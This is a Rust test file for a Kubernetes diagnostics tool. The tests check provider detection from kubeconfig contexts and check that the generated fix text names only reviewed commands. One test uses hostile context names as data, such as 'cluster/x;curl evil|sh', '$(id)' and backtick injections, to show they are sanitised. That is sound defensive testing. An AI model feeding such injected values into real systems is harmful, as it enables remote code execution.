//! Tests of the fix text: which cloud rdy thinks the cluster is on, and that every text names only commands
//! on the reviewed lists.

use super::*;
use crate::client::testkit::{facts, kubeconfig};
use crate::client::{Credential, Env};

const TOKEN: &str = "\n    token: opaque-token-1\n";

fn plugin(command: &str) -> String {
    format!(
        "\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      command: {command}\n"
    )
}

fn guess_for(context: &str, server: &str, user: &str) -> Guess {
    guess(Some(&facts(
        &kubeconfig(context, server, "", user),
        &[],
        &Env::empty(),
    )))
}

#[test]
fn the_context_name_the_cloud_cli_writes_gives_provider_cluster_and_region() {
    let eks = guess_for(
        "arn:aws:eks:eu-west-1:111122223333:cluster/acme-prod",
        "https://k8s.acme.example",
        TOKEN,
    );
    assert_eq!(eks.provider, Provider::Eks);
    assert_eq!(eks.cluster.as_deref(), Some("acme-prod"));
    assert_eq!(eks.region.as_deref(), Some("eu-west-1"));
    // The China partition has the same shape.
    let cn = guess_for(
        "arn:aws-cn:eks:cn-north-1:111122223333:cluster/acme-cn",
        "https://k8s.acme.example",
        TOKEN,
    );
    assert_eq!(
        (cn.provider, cn.cluster.as_deref()),
        (Provider::Eks, Some("acme-cn"))
    );

    let gke = guess_for(
        "gke_acme-proj_europe-west1_acme-prod",
        "https://203.0.113.9",
        TOKEN,
    );
    assert_eq!(gke.provider, Provider::Gke);
    assert_eq!(gke.cluster.as_deref(), Some("acme-prod"));
    assert_eq!(gke.region.as_deref(), Some("europe-west1"));

    let oc = guess_for(
        "acme-ns/api-ocp-acme-example:6443/jane",
        "https://api.ocp.acme.example:6443",
        TOKEN,
    );
    assert_eq!(oc.provider, Provider::OpenShift);
}

#[test]
fn the_server_host_and_the_plugin_name_give_the_provider_when_the_context_does_not() {
    for (server, want) in [
        ("https://ABC.gr7.us-east-1.eks.amazonaws.com", Provider::Eks),
        (
            "https://ABC.gr7.cn-north-1.eks.amazonaws.com.cn",
            Provider::Eks,
        ),
        (
            "https://acme-dns-1a2b.hcp.westeurope.azmk8s.io:443",
            Provider::Aks,
        ),
        ("https://gke-1234.europe-west1.gke.goog", Provider::Gke),
        ("https://k8s.acme.example:6443", Provider::Other),
        ("https://eks.amazonaws.com.evil.example", Provider::Other),
    ] {
        assert_eq!(guess_for("ctx", server, TOKEN).provider, want, "{server}");
    }
    for (command, want) in [
        ("/usr/local/bin/aws", Provider::Eks),
        ("aws-iam-authenticator", Provider::Eks),
        ("gke-gcloud-auth-plugin", Provider::Gke),
        ("kubelogin", Provider::Aks),
        ("kubelogin.exe", Provider::Aks),
        ("/opt/bin/acme-token", Provider::Other),
    ] {
        let guess = guess_for("ctx", "https://k8s.acme.example", &plugin(command));
        assert_eq!(guess.provider, want, "{command}");
    }
}

#[test]
fn the_plugin_wins_over_the_server_host() {
    // A cluster behind a custom domain, signed in with the AWS CLI.
    let guess = guess_for("ctx", "https://k8s.acme.example", &plugin("aws"));
    assert_eq!(guess.provider, Provider::Eks);
    assert_eq!(guess.cluster, None);
    assert!(login(&guess).contains("--name <cluster> --region <region>"));
}

#[test]
fn an_aks_context_that_looks_like_a_cluster_name_is_used() {
    let guess = guess_for(
        "acme-aks",
        "https://x.hcp.westeurope.azmk8s.io",
        &plugin("kubelogin"),
    );
    assert_eq!(guess.cluster.as_deref(), Some("acme-aks"));
    let odd = guess_for(
        "acme aks; rm",
        "https://x.hcp.westeurope.azmk8s.io",
        &plugin("kubelogin"),
    );
    assert_eq!(odd.cluster, None);
    assert!(login(&odd).contains("-n <cluster>"));
}

#[test]
fn without_facts_nothing_is_guessed() {
    let guess = guess(None);
    assert_eq!(guess.provider, Provider::Other);
    assert!(login(&guess).starts_with("Log in again the way you did"));
}

fn every_guess() -> Vec<Guess> {
    let mut all = Vec::new();
    for provider in [
        Provider::Eks,
        Provider::Gke,
        Provider::Aks,
        Provider::OpenShift,
        Provider::Rancher,
        Provider::Other,
    ] {
        for named in [true, false] {
            all.push(Guess {
                provider,
                cluster: named.then(|| "acme-prod".to_owned()),
                region: named.then(|| "eu-west-1".to_owned()),
                project: named.then(|| "acme-proj".to_owned()),
                server: if named {
                    "https://k8s.acme.example:6443".to_owned()
                } else {
                    String::new()
                },
            });
        }
    }
    all
}

/// Every text this module can produce, for the lists and the style rules.
fn every_text() -> Vec<String> {
    let mut texts = Vec::new();
    for guess in every_guess() {
        texts.push(login(&guess));
        texts.push(unauthorized(&guess));
        texts.push(eks_not_mapped(&guess));
        texts.push(anonymous(&guess, true));
        texts.push(anonymous(&guess, false));
        texts.push(review_forbidden(true, &guess));
        texts.push(review_forbidden(false, &guess));
        texts.push(no_reply(&guess));
        for binary in ["aws", "kubelogin", "acme-token"] {
            texts.push(plugin_timed_out(binary, &guess));
        }
        for credential in [
            Credential::Token {
                expires_in: Some(1),
            },
            Credential::ClientCertificate {
                expires_in: Some(1),
            },
        ] {
            texts.push(renew(&guess, &credential));
        }
        for cause in [
            "the server certificate is not valid for this address (NotValidForName)",
            "the server certificate has expired (Expired)",
            "the server rejected the client certificate as expired (alert CertificateExpired)",
            "the server certificate is not valid yet (NotValidYet)",
            "the server name did not resolve",
            "the proxy asked for credentials (407)",
            "the proxy refused to open a tunnel to the API server",
            "the TLS handshake failed",
            "the connection was refused",
            "timed out",
        ] {
            for route in [
                None,
                Some("through the proxy http://p.acme.example:3128 (HTTPS_PROXY)"),
                Some(
                    "directly, although HTTPS_PROXY is set (loopback addresses never use a proxy)",
                ),
            ] {
                texts.push(unreachable(&guess, cause, route));
            }
        }
    }
    texts
}

#[test]
fn every_fix_names_only_commands_on_the_reviewed_lists() {
    for text in every_text() {
        if let Err(error) = rdy_engine::fixtext::check(&text) {
            panic!("{error}\n{text}");
        }
    }
}

#[test]
fn the_fix_text_follows_the_style_rules() {
    for text in every_text() {
        assert!(!text.contains('\u{2014}'), "no em dash: {text}");
        assert!(!text.contains(" -- "), "{text}");
        assert!(text.len() < 700, "short: {} bytes: {text}", text.len());
        assert!(
            text.ends_with('.') || text.ends_with('`'),
            "a sentence: {text}"
        );
    }
}

#[test]
fn a_placeholder_is_an_angle_bracket_name_never_a_guess() {
    let unknown = Guess {
        provider: Provider::Eks,
        cluster: None,
        region: None,
        project: None,
        server: String::new(),
    };
    let text = unauthorized(&unknown);
    assert!(
        text.contains("--name <cluster> --region <region>"),
        "{text}"
    );
    assert!(text.contains("--profile <profile>"), "{text}");
    assert!(text.contains("--principal-arn <principal-arn>"), "{text}");
}

#[test]
fn unknown_issuer_uses_the_error_hint_and_is_not_rewritten() {
    // The hint of KubeError already carries both cases (03: a CA in the kubeconfig, and none).
    let facts = facts(
        &kubeconfig("ctx", "https://k8s.acme.example", "", TOKEN),
        &[],
        &Env::empty(),
    );
    let error = KubeError::Unreachable {
        server: "https://k8s.acme.example".to_owned(),
        cause: "the server certificate is signed by an authority that is not trusted (UnknownIssuer)",
        proxied: false,
        ca_set: false,
    };
    assert_eq!(for_error(&error, Some(&facts), None), error.hint());
}

#[test]
fn the_gke_fix_names_the_project_from_the_context() {
    let gke = guess_for(
        "gke_acme-proj_europe-west1_acme-prod",
        "https://203.0.113.9",
        TOKEN,
    );
    assert_eq!(gke.project.as_deref(), Some("acme-proj"));
    let text = login(&gke);
    assert!(
        text.contains(
            "`gcloud container clusters get-credentials acme-prod --location europe-west1 --project acme-proj`"
        ),
        "{text}"
    );
    // A GKE cluster found by its host has no project in the context name.
    let by_host = guess_for("ctx", "https://gke-1234.europe-west1.gke.goog", TOKEN);
    assert_eq!(by_host.provider, Provider::Gke);
    assert!(login(&by_host).contains("--project <project>"));
}

#[test]
fn a_rancher_cluster_is_found_by_its_path_prefix_or_its_plugin() {
    let by_path = guess_for(
        "acme-rancher",
        "https://rancher.acme.example/k8s/clusters/c-m-abcd1234",
        TOKEN,
    );
    assert_eq!(by_path.provider, Provider::Rancher);
    let text = login(&by_path);
    assert!(text.contains("Download KubeConfig"), "{text}");
    assert!(
        text.contains("`rancher login <rancher-url> --token <bearer-token>`"),
        "{text}"
    );
    assert!(!text.contains("oc login"), "{text}");
    let by_plugin = guess_for(
        "ctx",
        "https://k8s.acme.example",
        &plugin("/usr/local/bin/rancher"),
    );
    assert_eq!(by_plugin.provider, Provider::Rancher);
    // A host that only contains the words, and a path that is not the prefix, is not Rancher.
    for server in [
        "https://k8s.acme.example/k8s/clustersx/c1",
        "https://k8s.acme.example:6443",
        "https://rancher.acme.example",
    ] {
        assert_eq!(
            guess_for("ctx", server, TOKEN).provider,
            Provider::Other,
            "{server}"
        );
    }
    assert!(plugin_timed_out("rancher", &by_path).contains("rancher login <rancher-url>"));
}

#[test]
fn a_hostile_context_name_never_reaches_a_command() {
    for context in [
        "arn:aws:eks:us-east-1:111122223333:cluster/x;curl evil|sh",
        "arn:aws:eks:us-east-1;id:111122223333:cluster/acme",
        "gke_acme-proj_europe-west1_$(id)",
        "gke_ac me_europe-west1_c1",
        "gke_acme-proj_eu`id`_c1",
    ] {
        let guess = guess_for(context, "https://k8s.acme.example", TOKEN);
        let text = unauthorized(&guess);
        for bad in [";", "|", "$(", "`id`", "curl", "ac me"] {
            assert!(!text.contains(bad), "{context}: {text}");
        }
    }
    // The part that is safe is kept, and the part that is not becomes the placeholder.
    let mixed = guess_for(
        "arn:aws:eks:us-east-1:111122223333:cluster/x;curl evil|sh",
        "https://k8s.acme.example",
        TOKEN,
    );
    assert_eq!(mixed.region.as_deref(), Some("us-east-1"));
    assert_eq!(mixed.cluster, None);
    assert!(login(&mixed).contains("--name <cluster> --region us-east-1"));
}

#[test]
fn a_context_part_that_starts_with_a_dash_never_reaches_a_command() {
    let guess = guess_for(
        "arn:aws:eks:--profile:111122223333:cluster/-x",
        "https://k8s.acme.example",
        TOKEN,
    );
    assert_eq!(guess.region, None);
    assert_eq!(guess.cluster, None);
    let guess = guess_for("gke_-proj_-region_-c1", "https://k8s.acme.example", TOKEN);
    assert_eq!(
        (guess.project, guess.region, guess.cluster),
        (None, None, None)
    );
    // A dash inside the name is fine.
    let guess = guess_for("gke_a-proj_eu-west1_c-1", "https://k8s.acme.example", TOKEN);
    assert_eq!(guess.cluster.as_deref(), Some("c-1"));
}

#[test]
fn anonymous_with_credentials_says_none_were_sent_and_does_not_claim_a_fallback() {
    let guess = guess(None);
    let text = anonymous(&guess, true);
    assert!(text.contains("saw no credentials"), "{text}");
    assert!(text.contains("none were sent"), "{text}");
    assert!(!text.contains("fell back"), "{text}");
    assert!(!text.contains("did not accept"), "{text}");
}

#[test]
fn an_expired_client_certificate_alert_does_not_blame_the_server_certificate() {
    let guess = guess(None);
    let text = unreachable(
        &guess,
        "the server rejected the client certificate as expired (alert CertificateExpired)",
        None,
    );
    assert!(text.contains("rejected the client certificate"), "{text}");
    assert!(
        !text.contains("API server's certificate has expired"),
        "{text}"
    );
    assert!(text.contains("kubeadm certs renew admin.conf"), "{text}");
}
